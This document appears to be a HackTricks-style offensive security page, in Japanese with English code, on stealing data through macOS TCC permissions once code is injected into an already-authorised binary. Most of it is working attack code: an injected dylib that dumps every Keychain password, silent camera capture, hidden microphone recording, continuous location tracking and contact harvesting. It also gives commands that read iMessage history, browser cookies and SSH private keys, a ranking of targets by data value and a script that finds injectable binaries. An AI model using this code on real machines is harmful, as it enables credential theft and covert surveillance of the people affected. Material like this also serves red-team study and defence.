# macOS の TCC 権限を介した認証情報とデータの窃取

{{#include ../../../banners/hacktricks-training.md}}

## 概要

macOS TCC (Transparency, Consent, and Control) は機密性の高いユーザーデータへのアクセスを保護します。攻撃者が **既に TCC が付与されたバイナリを奪取した場合**、その権限を継承します。本ページではデータ窃取に関連する各 TCC 権限の悪用可能性を記載します。

> [!WARNING]
> Code injection into a TCC-granted binary (via DYLD injection, dylib hijacking, or task port) **黙ってそのバイナリが持つ全ての TCC 権限を継承します**。同じプロセスが保護されたデータを読み取る際に追加のプロンプトや検証は行われません。

---

## Keychain アクセスグループ

### 獲得できるもの

macOS Keychain は以下を保存します:
- Wi-Fi パスワード — 保存されたすべての無線ネットワーク認証情報
- ウェブサイトのパスワード — Safari、Chrome（Keychain を使用している場合）、その他のブラウザのパスワード
- アプリケーションのパスワード — メールアカウント、VPN 認証情報、開発用トークン
- 証明書と秘密鍵 — コード署名、クライアント TLS、S/MIME 暗号化
- セキュアノート — ユーザーが保存した秘密情報

### エンタイトルメント: `keychain-access-groups`

Keychain のアイテムは **access groups** に整理されています。アプリケーションの `keychain-access-groups` エンタイトルメントは、どのグループにアクセスできるかを列挙します:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## カメラアクセス (kTCCServiceCamera)

### 悪用

カメラ TCC grant（`kTCCServiceCamera` または `com.apple.security.device.camera` entitlement を通じて）を持つバイナリは、写真やビデオをキャプチャできます:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> **macOS Sonoma**以降、メニューバーのカメラインジケータは常に表示され、プログラムから非表示にできません。**古い macOS バージョン**では、短時間のキャプチャでは目立つインジケータが表示されない場合があります。

---

## Microphone Access (kTCCServiceMicrophone)

### Exploitation

マイクへのアクセスは、内蔵マイク、ヘッドセット、または接続されたオーディオ入力デバイスからのすべての音声をキャプチャします：
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Attack: 周囲の録音
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## 位置追跡 (kTCCServiceLocation)

### 悪用
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### 継続的トラッキング
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## 連絡先 / カレンダー / 写真

### 個人データの持ち出し

| TCCサービス | フレームワーク | データ |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | 名前、メール、電話番号、住所 |
| `kTCCServiceCalendar` | `EventKit` | 会議、参加者、場所 |
| `kTCCServicePhotos` | `Photos.framework` | 写真、スクリーンショット、位置情報メタデータ |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### 連絡先の収集
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud アカウントアクセス

### Entitlement: `com.apple.private.icloud-account-access`

この entitlement は `com.apple.iCloudHelper` XPC サービスと通信することを許可し、以下へのアクセスを提供します:
- **iCloud tokens** — ユーザーの Apple ID の認証トークン
- **iCloud Drive** — すべてのデバイスから同期されたドキュメント
- **iCloud Keychain** — すべての Apple デバイスで同期されたパスワード
- **Find My** — ユーザーのすべての Apple デバイスの位置情報
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> iCloud権限を持つバイナリを乗っ取ると、攻撃は**単一のデバイスからAppleエコシステム全体へ**拡大します：他のMac、iPhone、iPad、Apple Watch。iCloud Keychainの同期により、すべてのデバイスのパスワードにアクセス可能になります。
 
---

## フルディスクアクセス (kTCCServiceSystemPolicyAllFiles)

### 最も強力なTCC権限

フルディスクアクセスはシステム上の**すべてのファイル**への読み取り権限を与えます。含まれるのは：
- 他アプリのデータ（Messages, Mail, Safariの履歴）
- TCCデータベース（他のすべての権限を明らかにする）
- SSH鍵と設定
- ブラウザのクッキーおよびセッショントークン
- アプリケーションのデータベースとキャッシュ
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## エクスプロイト優先度マトリックス

注入可能なTCC付与バイナリを評価する際は、データの価値に応じて優先順位を付ける:

| 優先度 | TCC 権限 | 理由 |
|---|---|---|
| **重大** | Full Disk Access | すべてへのアクセス |
| **重大** | TCC Manager | 任意の権限を付与可能 |
| **高** | Keychain Access Groups | 保存されたすべてのパスワード |
| **高** | iCloud Account Access | 複数デバイスの侵害 |
| **高** | Input Monitoring (ListenEvent) | Keylogging |
| **高** | Accessibility | GUI制御、自己付与 |
| **中** | Screen Capture | 視覚データのキャプチャ |
| **中** | Camera + Microphone | 監視 |
| **中** | Contacts + Calendar | Social engineering data |
| **低** | Location | 物理的追跡 |
| **低** | Photos | 個人データ |

## 列挙スクリプト
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## 参考文献

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objectivesee.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../banners/hacktricks-training.md}}
